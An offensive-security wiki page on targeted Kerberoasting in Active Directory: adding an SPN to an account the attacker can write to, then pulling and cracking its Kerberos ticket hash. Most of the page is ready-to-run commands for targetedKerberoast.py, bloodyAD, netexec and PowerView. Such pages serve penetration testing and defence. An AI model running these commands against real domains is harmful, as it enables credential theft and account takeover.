---
authors: ShutdownRepo, sckdev
category: ad
---

# Targeted Kerberoasting

This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target. A member of the [Account Operator](../builtins/security-groups) group usually has those permissions.

The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](../kerberos/kerberoast.md). This technique is called Targeted Kerberoasting. 

::: tabs

=== UNIX-like

From UNIX-like systems, this can be done with [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast) (Python)

```bash
targetedKerberoast.py -v -d "$DC_HOST" -u "$USER" -p "$PASSWORD"
```

---
**Alternative 1:** Using [bloodyAD](https://github.com/CravateRouge/bloodyAD) and [netexec](https://github.com/Pennyw0rth/NetExec)

```
# Add a SPN to attribute to the targeted account
bloodyAD -d "$DOMAIN" --host "$DC_HOST" -u "$USER" -p "$PASSWORD" set object "$TARGET" servicePrincipalName -v 'http/anything'

nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -H "$NThash" --kerberoasting kerberoastables.txt
```


=== Windows

From Windows machines, this can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) and [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
# Make sur that the target account has no SPN
Get-DomainUser 'victimuser' | Select serviceprincipalname

# Set the SPN
Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash
$User = Get-DomainUser 'victimuser'
$User | Get-DomainSPNTicket | fl

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

:::


Once the Kerberoast hash is obtained, it can possibly be [cracked](../credentials/cracking.md) to recover the account's password if the password used is weak enough.
